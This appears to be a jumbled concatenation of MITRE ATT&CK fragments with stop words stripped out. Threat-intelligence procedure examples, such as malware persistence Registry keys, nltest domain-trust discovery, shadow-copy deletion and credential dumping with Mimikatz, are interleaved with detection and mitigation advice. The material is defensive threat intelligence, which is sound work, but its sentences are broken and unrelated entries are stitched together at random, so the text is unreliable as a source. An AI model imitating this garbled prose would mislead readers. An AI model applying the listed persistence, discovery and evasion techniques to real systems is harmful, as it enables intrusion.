host.(Citation: Volexity InkySquid RokRAT August 2021) Holding Shift key logging prevents apps automatically.(Citation: Re-Open windows Mac) Monitor contextual data Internet-facing resource gathered scan, running services ports compromise third-party infrastructure targeting. Detection efforts focused stages adversary lifecycle, Command Control. [FlawedAmmyy](https://attack.mitre.org/software/S0381) enumerates privilege level victim initial infection.(Citation: Proofpoint TA505 Mar 2018)(Citation: Korean FSI TA505 2020) [DarkWatchman](https://attack.mitre.org/software/S0673) uninstall malicious components Registry, processes, browser history.(Citation: Prevailion DarkWatchman 2021) [Xbash](https://attack.mitre.org/software/S0341) collect IP addresses local intranet victim’s machine.(Citation: Unit42 Xbash Sept 2018) [APT1](https://attack.mitre.org/groups/G0006) open-source tools privilege escalation purposes.(Citation: Mandiant APT1) [CHOPSTICK](https://attack.mitre.org/software/S0023) access Windows Registry, gather information.(Citation: FireEye APT28) [Brave Prince](https://attack.mitre.org/software/S0252) terminates antimalware processes.(Citation: McAfee Gold Dragon) Refer NIST guidelines creating password policies master passwords.(Citation: NIST 800-63-3) Monitor DLL/PE file events, creation binary files loading DLLs processes. Utilization Windows APIs involve processes loading/accessing DLLs providing called functions (ex: ntdll.dll, kernel32.dll, advapi32.dll, user32.dll, gdi32.dll). Monitoring DLL loads, abnormal/unusual malicious processes, abuse Windows API. noisy, data combined indicators identify adversary activity. [Heyoka Backdoor](https://attack.mitre.org/software/S1027) spread malicious document lures.(Citation: SentinelOne Aoqin Dragon June 2022) [Bonadan](https://attack.mitre.org/software/S0486) create bind reverse shells infected system.(Citation: ESET ForSSHe December 2018)	 Monitor analyze calls functions  `GetProcAddress()` `LoadLibrary()` dynamically loading API functions.(Citation: Huntress API Hash) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) steganography multiple operations conceal malicious payloads.(Citation: Trend Micro Tick November 2019) [Aquatic Panda](https://attack.mitre.org/groups/G0143) downloaded additional scripts executed Base64 encoded commands PowerShell.(Citation: CrowdStrike AQUATIC PANDA December 2021) Continuous monitoring vulnerability sources automatic manual code review tools implemented well.(Citation: OWASP 10) Monitor newly executed processes abuse Outlook forms persistence compromised system. [Hancitor](https://attack.mitre.org/software/S0499) deleted files VBA <code>kill</code> function.(Citation: FireEye Hancitor) [Octopus](https://attack.mitre.org/software/S0340) capture screenshots victims’ machine.(Citation: Securelist Octopus Oct 2018)(Citation: Security Affairs DustSquad Oct 2018)(Citation: ESET Nomadic Octopus 2018) [BlackEnergy](https://attack.mitre.org/software/S0089) capability communicate backup channel plus.google.com.(Citation: Securelist BlackEnergy Nov 2014) Monitor newly constructed files attempt hide artifacts behaviors evade detection. [BlackEnergy](https://attack.mitre.org/software/S0089) communicates C2 server HTTP.(Citation: F-Secure BlackEnergy 2014) [MCMD](https://attack.mitre.org/software/S0500) Registry persistence.(Citation: Secureworks MCMD July 2019) [Komplex](https://attack.mitre.org/software/S0162) payload stored hidden directory <code>/Users/Shared/.local/kextd</code>.(Citation: Sofacy Komplex Trojan) UAC bypass techniques exist, prudent enforcement level UAC mitigate bypass opportunities exist techniques [DLL Search Hijacking](https://attack.mitre.org/techniques/T1038). [NanHaiShu](https://attack.mitre.org/software/S0228) collects username victim.(Citation: fsecure NanHaiShu July 2016) Monitor 2FA/MFA application logs suspicious events rapid login attempts valid credentials. [Koadic](https://attack.mitre.org/software/S0250) scheduled tasks add persistence.(Citation: MalwareBytes LazyScripter Feb 2021)  [Torisma](https://attack.mitre.org/software/S0678) collect local MAC address `GetAdaptersInfo` system's IP address.(Citation: McAfee Lazarus Nov 2020) [APT39](https://attack.mitre.org/groups/G0087) leveraged spearphishing emails malicious links initially compromise victims.(Citation: FireEye APT39 Jan 2019)(Citation: FBI FLASH APT39 September 2020) [ShimRatReporter](https://attack.mitre.org/software/S0445) Windows API functions gather infected system.(Citation: FOX-IT 2016 Mofang) [iKitten](https://attack.mitre.org/software/S0278) collects keychains system.(Citation: objsee mac malware 2017) Baseline periodically analyze Configuration partition schema alert creation nTDSDSA objects.(Citation: DCShadow Blog) Restrict software installation user require it. VNC server manually installed user adversary. encryption layer security sensitive email. Encryption public key cryptography requires adversary private certificate encryption key decrypt messages. [Mimikatz](https://attack.mitre.org/software/S0002) performs credential dumping account password gaining access additional systems enterprise network resources. functionality acquire credentials ways, including LSA.(Citation: Deply Mimikatz)(Citation: GitHub Mimikatz lsadump Module)(Citation: Directory Services Internals DPAPI Backup Oct 2015)(Citation: NCSC Joint Report Public Tools) (Citation: FireEye SUNBURST Backdoor December 2020)(Citation: MSTIC NOBELIUM 2021)(Citation: Secureworks IRON RITUAL Profile) [MuddyWater](https://attack.mitre.org/groups/G0069) exploited Office vulnerability CVE-2017-0199 execution.(Citation: ClearSky MuddyWater June 2019) [Attor](https://attack.mitre.org/software/S0438) performs injection attaching code APC queue NtQueueApcThread API.(Citation: ESET Attor Oct 2019) user training bring awareness raise suspicion malicious events (ex: Office documents prompting credentials). [Bandook](https://attack.mitre.org/software/S0234) collect local files .(Citation: CheckPoint Bandook Nov 2020)  implementing disaster recovery plans procedures regular data backups restore organizational data.(Citation: Ready.gov DRP) Ensure backups stored protected common methods adversaries gain access destroy backups prevent recovery. Monitor processes viewed inject malicious code hijacked processes evade process-based defenses elevate privileges. [PowerShower](https://attack.mitre.org/software/S0441) ability save execute VBScript.(Citation: Unit 42 Inception November 2018) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [FIN8](https://attack.mitre.org/groups/G0061) retrieved list trusted domains <code>[Nltest](https://attack.mitre.org/software/S0359).exe /domain_trusts</code>.(Citation: Bitdefender FIN8 July 2021) [Ursnif](https://attack.mitre.org/software/S0386) copied infected files network drives propagation.(Citation: TrendMicro Ursnif Mar 2015)(Citation: TrendMicro Ursnif File Dec 2014) [XAgentOSX](https://attack.mitre.org/software/S0161) deletFileFromPath function delete file NSFileManager:removeFileAtPath method.(Citation: XAgentOSX 2017) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [Bonadan](https://attack.mitre.org/software/S0486) <code>ps</code> command discover cryptocurrency miners active system.(Citation: ESET ForSSHe December 2018) [APT39](https://attack.mitre.org/groups/G0087) leveraged spearphishing emails malicious attachments initially compromise victims.(Citation: FireEye APT39 Jan 2019)(Citation: Symantec Chafer February 2018)(Citation: FBI FLASH APT39 September 2020) [Lazarus Group](https://attack.mitre.org/groups/G0032) malware sample encrypts data simple byte based XOR operation prior exfiltration.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Loaders)(Citation: Novetta Blockbuster RATs)(Citation: McAfee Lazarus Resurfaces Feb 2018) [MESSAGETAP](https://attack.mitre.org/software/S0443) checks files, keyword_parm.txt parm.txt, instructions target save data parsed extracted SMS message data network traffic. SMS message contained phone number, IMSI number, keyword matched predefined list, saved CSV file theft threat actor.(Citation: FireEye MESSAGETAP October 2019) Enable Hardened Runtime capability developing applications. include <code>com.apple.security.get-task-allow</code> entitlement set variation true.  [RTM](https://attack.mitre.org/software/S0148) scan victim drives specific banking software machine determine actions.(Citation: ESET RTM Feb 2017) [Hancitor](https://attack.mitre.org/software/S0499) macro check ActiveDocument shape object lure message present. object found, macro exit downloading additional payloads.(Citation: FireEye Hancitor) Monitor executed commands arguments attempt listing network connections compromised accessing remote systems querying network. acquired Windows management tools [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) [PowerShell](https://attack.mitre.org/techniques/T1059/001).

For network devices, monitor executed commands AAA logs, unexpected unauthorized users. (Citation: SecureWorks August 2019) [Gorgon Group](https://attack.mitre.org/groups/G0078) macros [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)s executed VBScripts victim machines.(Citation: Unit 42 Gorgon Aug 2018) Establish centralized logging activity cloud compute infrastructure components. Monitor suspicious sequences events, deletion multiple snapshots short period time. reduce false positives, valid change management procedures introduce identifier logged change tag header) supported cloud provider, distinguish valid, expected actions malicious ones. [VERMIN](https://attack.mitre.org/software/S0257) list processes running tasks system.(Citation: Unit 42 VERMIN Jan 2018) Locations <code>profile.ps1</code> stored monitored profiles. (Citation: Malware Archaeology PowerShell Cheat Sheet) profile locations include:
* <code>$PsHome\Profile.ps1</code>
* <code>$PsHome\Microsoft.{HostProgram}_profile.ps1</code>
* <code>$Home\My Documents\PowerShell\Profile.ps1</code>
* <code>$Home\My Documents\PowerShell\Microsoft.{HostProgram}_profile.ps1</code> [Empire](https://attack.mitre.org/software/S0363) enumerate username targeted hosts.(Citation: Talos Frankenstein June 2019) Monitor analyze network flows protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns). analyzing newly constructed network connections received untrusted hosts, unexpcted hardware devices, uncommon data flows. [HEXANE](https://attack.mitre.org/groups/G1001) set custom DNS servers send commands compromised hosts TXT records.(Citation: Zscaler Lyceum DnsSystem June 2022) [BISCUIT](https://attack.mitre.org/software/S0017) command launch command system.(Citation: Mandiant APT1 Appendix) Authentication, Authorization, Accounting (AAA) systems limit actions users perform provide history user actions detect unauthorized abuse. Ensure privilege principles applied user accounts authorized users perform configuration changes. (Citation: Cisco IOS Software Integrity Assurance - AAA) [PoetRAT](https://attack.mitre.org/software/S0428) ability compress files zip.(Citation: Talos PoetRAT April 2020) [ZxxZ](https://attack.mitre.org/software/S1013) XOR key decrypt strings.(Citation: Cisco Talos Bitter Bangladesh 2022) [Duqu](https://attack.mitre.org/software/S0038) capable loading executable code process hollowing.(Citation: Symantec W32.Duqu) Monitor API calls enumerate files directories search specific locations host network share file system. [SeaDuke](https://attack.mitre.org/software/S0053) event filter WMI code execute dropped executable shortly startup.(Citation: FireEye WMI 2015) [TYPEFRAME](https://attack.mitre.org/software/S0263) delete files system.(Citation: US-CERT TYPEFRAME June 2018) [APT3](https://attack.mitre.org/groups/G0022) tool files remote machines.(Citation: FireEye Clandestine Fox) [BitPaymer](https://attack.mitre.org/software/S0570) dynamic API resolution avoid identifiable strings binary, including <code>RegEnumKeyW</code>.(Citation: Crowdstrike Indrik November 2018) utilities detect mitigate common features exploitation, Enhanced Mitigation Experience Toolkit (EMET). Monitor contextual data file, include name, content (ex: signature, headers, data/media), user/ower, permissions, aid manipulation data hide activity [LitePower](https://attack.mitre.org/software/S0680) identify installed AV software.(Citation: Kaspersky WIRTE November 2021) Monitor API calls acquire credentials browsers reading files specific target browser.(Citation: Talos Olympic Destroyer 2018) [CopyKittens](https://attack.mitre.org/groups/G0052) digitally signed executable stolen certificate legitimate company Squared.(Citation: ClearSky Wilted Tulip July 2017) [Sandworm Team](https://attack.mitre.org/groups/G0034)'s BCS-server tool connects designated C2 server HTTP.(Citation: ESET Telebots Dec 2016)	 establishing persistence installation service fails, variant [Elise](https://attack.mitre.org/software/S0081) establishes persistence created .exe file setting Registry key: <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run\svchost : %APPDATA%\Microsoft\Network\svchost.exe</code>. variants set Registry persistence: <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run\imejp : [self]</code> <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IAStorD</code>.(Citation: Lotus Blossom Jun 2015)(Citation: Accenture Dragonfish Jan 2018) Adversaries DLLs execute technique. Identify block malicious software executed search hijacking application whitelisting solutions capable blocking DLLs loaded legitimate software. <code>HISTCONTROL</code> environment variable set “ignoredup” “ignoreboth” “ignorespace”. [HEXANE](https://attack.mitre.org/groups/G1001) conducted internal spearphishing attacks executives, HR, personnel gain access.(Citation: SecureWorks August 2019) [ShimRatReporter](https://attack.mitre.org/software/S0445) listed running processes machine.(Citation: FOX-IT 2016 Mofang) Monitor files perform escapes exploit vulnerabilities application setsuid setgid bits code running user’s context. [Industroyer](https://attack.mitre.org/software/S0604) data wiper component enumerates Registry <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services</code>.(Citation: ESET Industroyer) [Reaver](https://attack.mitre.org/software/S0172) collects victim's IP address.(Citation: Palo Alto Reaver Nov 2017) [APT33](https://attack.mitre.org/groups/G0064) lured users links malicious applications delivered spearphishing emails.(Citation: FireEye APT33 Sept 2017)(Citation: Symantec Elfin Mar 2019) [Sandworm Team](https://attack.mitre.org/groups/G0034) tool query Active Directory LDAP, discovering usernames listed AD.(Citation: ESET Telebots Dec 2016)	 [BONDUPDATER](https://attack.mitre.org/software/S0360) written PowerShell.(Citation: FireEye APT34 Dec 2017)(Citation: Palo Alto OilRig Sep 2018) [BlackTech](https://attack.mitre.org/groups/G0098) e-mails malicious documents lure victims installing malware.(Citation: TrendMicro BlackTech June 2017)(Citation: NTT Security Flagpro December 2021)	  [RTM](https://attack.mitre.org/software/S0148) capture screenshots.(Citation: ESET RTM Feb 2017)(Citation: Unit42 Redaman January 2019) (Citation: Secureworks BRONZE BUTLER Oct 2017) impact generated golden ticket, reset built-in KRBTGT account password twice, invalidate existing golden tickets created KRBTGT hash Kerberos tickets derived it. domain, change KRBTGT account password once, force replication, change password time. rotating KRBTGT account password 180 days.(Citation: STIG krbtgt reset) Monitor newly constructed files JavaScript, developing rules variants, combination encoding encryption schemes, challenging. monitoring files downloaded Internet, Smuggling, suspicious activities. Data events viewed isolation, chain behavior lead activities. Monitor processes suspicious malicious MMC. MMC signed Windows binary, verify MMC legitimate malicious. Tools Sysinternals Autoruns detect execution triggers attempts persistence. abnormal process trees execution commands relate Discovery actions techniques. Cloud service discovery techniques occur operation adversary targeting cloud-based systems services. Data events viewed isolation, chain behavior lead activities based obtained.
Normal, benign network events cloud service discovery uncommon, depending environment used. Monitor cloud service usage anomalous behavior adversarial presence environment. [UNC2452](https://attack.mitre.org/groups/G0118) multiple command-line utilities enumerate running processes.(Citation: Volexity SolarWinds)(Citation: Deep Dive Solorigate January 2021) Office method, create Registry key execute set permissions "Read Control" prevent easy access key administrator permissions requiring Privilege Escalation. (Citation: Palo Alto Office Sofacy) [SQLRat](https://attack.mitre.org/software/S0390) PowerShell create Meterpreter session.(Citation: Flashpoint FIN 7 March 2019) [Bazar](https://attack.mitre.org/software/S0534) fingerprint architecture, name, OS version compromised host. [Bazar](https://attack.mitre.org/software/S0534) check Russian language installed infected machine terminate found.(Citation: Cybereason Bazar July 2020)(Citation: NCC Team9 June 2020) Configuration management databases (CMDB) asset management systems detection systems network devices exist network. [FunnyDream](https://attack.mitre.org/campaigns/C0007) threat actors customized version [PcShare](https://attack.mitre.org/software/S1050).(Citation: Bitdefender FunnyDream Campaign November 2020) Monitor API calls search common password storage locations user credentials. (Citation: Cycraft Chimera April 2020)(Citation: NCC Chimera January 2021) [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) created hidden attribute insure visible victim.(Citation: CISA MAR SLOTHFULMEDIA October 2020) [macOS.OSAMiner](https://attack.mitre.org/software/S1048) `osascript` `do script` command [Launch Agent](https://attack.mitre.org/techniques/T1543/001) `.plist` file.(Citation: SentinelLabs reversing run-only applescripts 2021) (Citation: Symantec Elderwood Sept 2012) [Anchor](https://attack.mitre.org/software/S0504) create execute services load payload.(Citation: Cyberreason Anchor December 2019)(Citation: Medium Anchor DNS July 2020) [Leviathan](https://attack.mitre.org/groups/G0065) protocol tunneling conceal C2 communications infrastructure.(Citation: CISA AA21-200A APT40 July 2021) [Cobalt Strike](https://attack.mitre.org/software/S0154) ability Excel Workbook execute additional code enabling Office trust macros execute code user permission.(Citation: Talos Cobalt Strike September 2020) [DEATHRANSOM](https://attack.mitre.org/software/S0616) ability loop operations enumerate network resources.(Citation: FireEye FiveHands April 2021) (Citation: PWC WellMess July 2020)(Citation: PWC WellMess C2 August 2020)(Citation: CISA WellMess July 2020)(Citation: NCSC APT29 July 2020)(Citation: Cybersecurity Advisory SVR TTP 2021) [QuietSieve](https://attack.mitre.org/software/S0686) identify search networked drives specific file extensions.(Citation: Actinium February 2022) reuse local administrator account passwords systems. Ensure password complexity uniqueness passwords cracked guessed. [Elise](https://attack.mitre.org/software/S0081) injects DLL files iexplore.exe.(Citation: Lotus Blossom Jun 2015)(Citation: Accenture Dragonfish Jan 2018) [APT33](https://attack.mitre.org/groups/G0064) publicly exploit CVE-2017-0213 escalate privileges local system.(Citation: FireEye APT33 Guardrail) [PingPull](https://attack.mitre.org/software/S1031) ability exfiltrate stolen victim data C2 channel.(Citation: Unit 42 PingPull Jun 2022) [ShadowPad](https://attack.mitre.org/software/S0596) downloaded code C2 server.(Citation: Securelist ShadowPad Aug 2017) [Lokibot](https://attack.mitre.org/software/S0447) downloaded staged items victim's machine.(Citation: Talos Lokibot Jan 2021)  [Confucius](https://attack.mitre.org/groups/G0142) PowerShell execute malicious files payloads.(Citation: TrendMicro Confucius APT Aug 2021) [Gamaredon Group](https://attack.mitre.org/groups/G0047) batch scripts establish C2 download additional files. [Gamaredon Group](https://attack.mitre.org/groups/G0047)'s backdoor malware written batch file.(Citation: Palo Alto Gamaredon Feb 2017)(Citation: ESET Gamaredon June 2020)(Citation: CERT-EE Gamaredon January 2021)(Citation: Unit 42 Gamaredon February 2022) [Smoke Loader](https://attack.mitre.org/software/S0226) recursively searches directories files.(Citation: Talos Smoke Loader July 2018) [Winnti Windows](https://attack.mitre.org/software/S0141) dropper component verify existence single command parameter terminate decryption key.(Citation: Novetta Winnti April 2015) Monitor unexpected deletion files (Citation: Fysbis Palo Alto Analysis) [UPPERCUT](https://attack.mitre.org/software/S0275) capability gather victim's current directory.(Citation: FireEye APT10 Sept 2018) [POSHSPY](https://attack.mitre.org/software/S0150) WMI event subscription establish persistence.(Citation: FireEye POSHSPY April 2017) [UNC2452](https://attack.mitre.org/groups/G0118) modified timestamps backdoors match legitimate Windows files.(Citation: Deep Dive Solorigate January 2021) [FinFisher](https://attack.mitre.org/software/S0182) heavily obfuscated ways, including spaghetti code functions effort confuse disassembly programs. custom XOR algorithm obfuscate code.(Citation: FinFisher Citation)(Citation: FinFisher March 2018) [BADNEWS](https://attack.mitre.org/software/S0128) identifies files extensions USB devices, copies predefined directory.(Citation: TrendMicro Patchwork Dec 2017) [Skeleton Key](https://attack.mitre.org/software/S0007) patch enterprise domain controller authentication process backdoor password. adversaries bypass standard authentication defined password accounts authenticating domain controller.(Citation: Dell Skeleton) Preemptively search files passwords actions reduce exposure risk found. Patch deployment systems regularly prevent potential remote access [Exploitation Privilege Escalation](https://attack.mitre.org/techniques/T1068). [Gamaredon Group](https://attack.mitre.org/groups/G0047) `mshta.exe` execute malicious HTA files.(Citation: Symantec Shuckworm January 2022) (Citation: Kaspersky Ferocious Kitten Jun 2021) [FIN7](https://attack.mitre.org/groups/G0046) exfiltrated stolen data MEGA file sharing site.(Citation: CrowdStrike Carbon Spider August 2021) [USBStealer](https://attack.mitre.org/software/S0136) monitors victims insertion removable drives. dropped victim, enumerates drives connected system.(Citation: ESET Sednit USBStealer 2014) [Saint Bot](https://attack.mitre.org/software/S1018) batch script named `del.bat` remove [Saint Bot](https://attack.mitre.org/software/S1018) payload-linked files compromise anti-analysis locale checks fail.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [PipeMon](https://attack.mitre.org/software/S0501) <code>LoadLibrary</code> load installer. [PipeMon](https://attack.mitre.org/software/S0501) loads modules reflective loading custom shellcode.(Citation: ESET PipeMon 2020) [P.A.S. Webshell](https://attack.mitre.org/software/S0598) upload download files compromised hosts.(Citation: ANSSI Sandworm January 2021) Detecting software exploitation difficult depending tools available. Software exploits succeed exploited process unstable crash. Application Firewalls detect improper inputs attempting exploitation. [FALLCHILL](https://attack.mitre.org/software/S0181) fake Transport Layer Security (TLS) communicate C2 server.(Citation: US-CERT FALLCHILL Nov 2017) [Windshift](https://attack.mitre.org/groups/G0112) e-mail attachments lure victims executing malicious code.(Citation: SANS Windshift August 2018) Train users identify aspects phishing attempts enter credentials incorrect domain application logging into. Monitor logged network traffic response scan protocol header body values steal SSL/TLS certificates targeting. Detection efforts focused behaviors, [Web Protocols](https://attack.mitre.org/techniques/T1071/001), [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002), [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004). [Crutch](https://attack.mitre.org/software/S0538) exfiltrate data primary C2 channel (Dropbox API).(Citation: ESET Crutch December 2020) [RTM](https://attack.mitre.org/software/S0148) ability remove Registry entries created persistence.(Citation: ESET RTM Feb 2017) [Gamaredon Group](https://attack.mitre.org/groups/G0047) inserted malicious macros existing documents, providing persistence reopened. [Gamaredon Group](https://attack.mitre.org/groups/G0047) loaded group's delivered VBA project relaunching Outlook <code>/altvba</code> option, Application.Startup event received.(Citation: ESET Gamaredon June 2020) [Chaes](https://attack.mitre.org/software/S0631) steal login credentials stored financial browser.(Citation: Cybereason Chaes Nov 2020) Monitor network data uncommon data flows abuse [Valid Accounts](https://attack.mitre.org/techniques/T1078) log service designed accept remote connections, RDP, telnet, SSH, VNC. Train users accept 2FA/MFA requests login attempts initiated, review source location login attempt prompting 2FA/MFA requests, report suspicious/unsolicited prompts. [P.A.S. Webshell](https://attack.mitre.org/software/S0598) display /etc/passwd file compromised host.(Citation: ANSSI Sandworm January 2021) [Dyre](https://attack.mitre.org/software/S0024) ability identify running services compromised host.(Citation: Malwarebytes Dyreza November 2015) [Tropic Trooper](https://attack.mitre.org/groups/G0081)'s backdoor list infected system's installed software.(Citation: TrendMicro Tropic Trooper 2020) Monitor unexpected deletions user accounts. Windows event logs designate activity adversary's attempt remove account (ex: Event 4726 - user account deleted).

Alerting Event IDs generate degree false positives, compare baseline knowledge systems typically correlate modification events indications malicious activity possible. [Patchwork](https://attack.mitre.org/groups/G0040) leveraged DDE protocol deliver malware.(Citation: TrendMicro Patchwork Dec 2017) Monitor command invocations tools capable modifying services doesn’t correspond normal usage patterns software, patch cycles, etc. Periodically check integrity images containers cloud deployments ensure modified include malicious software. (Citation: Recorded Future RedEcho Feb 2021) [GOLD SOUTHFIELD](https://attack.mitre.org/groups/G0115) conducted malicious spam (malspam) campaigns gain access victim's machines.(Citation: Secureworks REvil September 2019) [TrickBot](https://attack.mitre.org/software/S0266) obtains IP address, location, relevant network victim’s machine.(Citation: S2 Grupo TrickBot June 2017)(Citation: Trend Micro Trickbot Nov 2018)(Citation: Cyberreason Anchor December 2019) (Citation: CrowdStrike GTR 2019)(Citation: Secureworks IRON VIKING )(Citation: District Court Indictment GRU Unit 74455 October 2020)(Citation: NCSC Olympic Attacks October 2020)(Citation: Trend Micro Cyclops Blink March 2022) [Indrik Spider](https://attack.mitre.org/groups/G0119) served fake updates legitimate websites compromised.(Citation: Crowdstrike Indrik November 2018)	 [Nerex](https://attack.mitre.org/software/S0210) creates Registry subkey registers service.(Citation: Symantec Nerex 2012) [QuietSieve](https://attack.mitre.org/software/S0686) screenshots minutes saved user's local Application Data folder `Temp\SymbolSourceSymbols\icons` `Temp\ModeAuto\icons`.(Citation: Actinium February 2022) [Hildegard](https://attack.mitre.org/software/S0601) BOtB tool exploits CVE-2019-5736.(Citation: Unit 42 Hildegard Malware)  (Citation: Cybereason Cobalt Kitty 2017) [Anchor](https://attack.mitre.org/software/S0504) support windows execution SMB shares.(Citation: Medium Anchor DNS July 2020) [Ke3chang](https://attack.mitre.org/groups/G0004) compromised credentials sign victims’ 365 accounts.(Citation: NICKEL December 2021) [Sandworm Team](https://attack.mitre.org/groups/G0034) backdoor enumerate infected system's operating system.(Citation: ESET Telebots July 2017)(Citation: District Court Indictment GRU Unit 74455 October 2020)	 [Rocke](https://attack.mitre.org/groups/G0106)'s miner connects C2 server port 51640.(Citation: Anomali Rocke March 2019)	 [BackdoorDiplomacy](https://attack.mitre.org/groups/G0135) disguised backdoor droppers naming conventions designed blend normal operations.(Citation: ESET BackdoorDiplomacy Jun 2021) [Helminth](https://attack.mitre.org/software/S0170) splits data chunks 23 bytes sends data DNS queries C2 server.(Citation: Palo Alto OilRig 2016) Scripting execution perform actions effects generate events, depending types monitoring used. Monitor processes command-line arguments execution subsequent behavior. Actions network [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), programmable post-compromise behaviors indicators detection leading source. Monitor execution JXA <code>osascript</code> usage <code>OSAScript</code> API suspicious behavior occurring system.  [Operation Honeybee](https://attack.mitre.org/campaigns/C0006), malicious files decoded prior execution.(Citation: McAfee Honeybee) Monitor API calls employ detect avoid virtualization analysis environments. Detecting actions virtualization sandbox identification difficult depending adversary's implementation monitoring required. [Leviathan](https://attack.mitre.org/groups/G0065) spearphishing email links attempting user click.(Citation: Proofpoint Leviathan Oct 2017)(Citation: CISA AA21-200A APT40 July 2021) [ShimRat](https://attack.mitre.org/software/S0444) registered registry shim databases.(Citation: FOX-IT 2016 Mofang) [Lazarus Group](https://attack.mitre.org/groups/G0032) code signing certificates issued Sectigo RSA malware tools.(Citation: ESET Lazarus Jun 2020) [Kasidet](https://attack.mitre.org/software/S0088) ability change firewall settings plug-in downloaded.(Citation: Zscaler Kasidet) [DarkComet](https://attack.mitre.org/software/S0334) dropped victim machines file names WinDefender.Exe winupdate.exe apparent attempt masquerade legitimate file.(Citation: TrendMicro DarkComet Sept 2014) [Carberp](https://attack.mitre.org/software/S0484) collected list running processes.(Citation: Trusteer Carberp October 2010) [APT19](https://attack.mitre.org/groups/G0073) Regsvr32 bypass application control techniques.(Citation: FireEye APT19) [PoisonIvy](https://attack.mitre.org/software/S0012) starts rootkit malicious file dropped disk.(Citation: Symantec Darkmoon Aug 2005) [Kimsuky](https://attack.mitre.org/groups/G0094) macOS Python implant gather data MailFetcher.py code automatically collect email data.(Citation: CISA AA20-301A Kimsuky)(Citation: KISA Operation Muzabi) [SysUpdate](https://attack.mitre.org/software/S0663) create service establish persistence.(Citation: Trend Micro Iron Tiger April 2021) [MacMa](https://attack.mitre.org/software/S1016) delete compromised computer.(Citation: ESET DazzleSpy Jan 2022) [APT19](https://attack.mitre.org/groups/G0073) malware variant decrypts strings single-byte XOR keys.(Citation: Unit 42 C0d0so0 Jan 2016) [GALLIUM](https://attack.mitre.org/groups/G0093) renamed cmd.exe file evade detection.(Citation: Cybereason Soft Cell June 2019) Prevent critical business processes replaced, overwritten, reconfigured load malicious code. [EKANS](https://attack.mitre.org/software/S0605) disguised <code>update.exe</code> valid executable.(Citation: Dragos EKANS) [Ke3chang](https://attack.mitre.org/groups/G0004) performs operating discovery <code>systeminfo</code> implants identify language name.(Citation: Mandiant Operation Ke3chang November 2014)(Citation: NCC APT15 Alive Strong)(Citation: NICKEL December 2021) [ProLock](https://attack.mitre.org/software/S0654) vssadmin.exe remove volume shadow copies.(Citation: IB Ransomware September 2020) [HermeticWiper](https://attack.mitre.org/software/S0697) initiate shutdown.(Citation: SentinelOne Hermetic Wiper February 2022)(Citation: Qualys Hermetic Wiper March 2022) [Ramsay](https://attack.mitre.org/software/S0458) collect data removable media stage exfiltration.(Citation: Eset Ramsay 2020)	 [Gold Dragon](https://attack.mitre.org/software/S0249) enumerates registry command <code>regkeyenum</code> obtains Registry key <code>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code>.(Citation: McAfee Gold Dragon) [Kimsuky](https://attack.mitre.org/groups/G0094) modified versions source PHP shells maintain access, adding "Dinosaur" references code.(Citation: CISA AA20-301A Kimsuky) [down_new](https://attack.mitre.org/software/S0472) ability AES encrypt C2 communications.(Citation: Trend Micro Tick November 2019) [FIN6](https://attack.mitre.org/groups/G0037) actors compressed data remote systems moved staging exfiltration.(Citation: FireEye FIN6 April 2016) (Citation: Mandiant Operation Ke3chang November 2014)(Citation: NCC APT15 Alive Strong) [APT41](https://attack.mitre.org/groups/G0096) attempted remove evidence activity deleting Bash histories.(Citation: FireEye APT41 Aug 2019) multi-factor authentication logons code repositories. [Threat Group-3390](https://attack.mitre.org/groups/G0027) tool created Registry `HKEY_CURRENT_USER\Software\Classes\` `HKLM\SYSTEM\CurrentControlSet\services`.(Citation: Nccgroup Emissary Panda 2018)(Citation: Trend Micro Iron Tiger April 2021) [Sandworm Team](https://attack.mitre.org/groups/G0034) exfiltrated internal documents, files, data compromised hosts.(Citation: District Court Indictment GRU Unit 74455 October 2020) [Okrum](https://attack.mitre.org/software/S0439) MimikatzLite perform credential dumping.(Citation: ESET Okrum July 2019) [Leafminer](https://attack.mitre.org/groups/G0077) tool called MailSniper search files desktop utility called Sobolsoft extract attachments EML files.(Citation: Symantec Leafminer July 2018) [Mivast](https://attack.mitre.org/software/S0080) capability remote basic commands.(Citation: Symantec Backdoor.Mivast) [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) collected name, OS version, adapter information, memory usage, disk victim machine.(Citation: CISA MAR SLOTHFULMEDIA October 2020) Enable secure boot features validate digital signature boot environment image special purpose hardware device. validation check fails, device fail boot preventing loading unauthorized software. (Citation: Cisco IOS Software Integrity Assurance - Secure Boot)  endpoint security solutions configured block types process injection based common sequences behavior occur injection process.  implementing disaster recovery plans procedures regularly testing data backups restore organizational data.(Citation: Ready.gov DRP) Ensure backups stored protected common methods adversaries gain access destroy backups prevent recovery. enabling versioning cloud environments maintain backup copies storage objects.(Citation: Rhino S3 Ransomware 2) Monitor analyze traffic patterns packet inspection protocol(s), leveraging SSL/TLS inspection encrypted traffic, follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). (Citation: US-CERT Alert TA15-314A Shells) [ECCENTRICBANDWAGON](https://attack.mitre.org/software/S0593) stored keystrokes screenshots <code>%temp%\GoogleChrome</code>, <code>%temp%\Downloads</code>, <code>%temp%\TrendMicroUpdate</code> directories.(Citation: CISA EB Aug 2020) 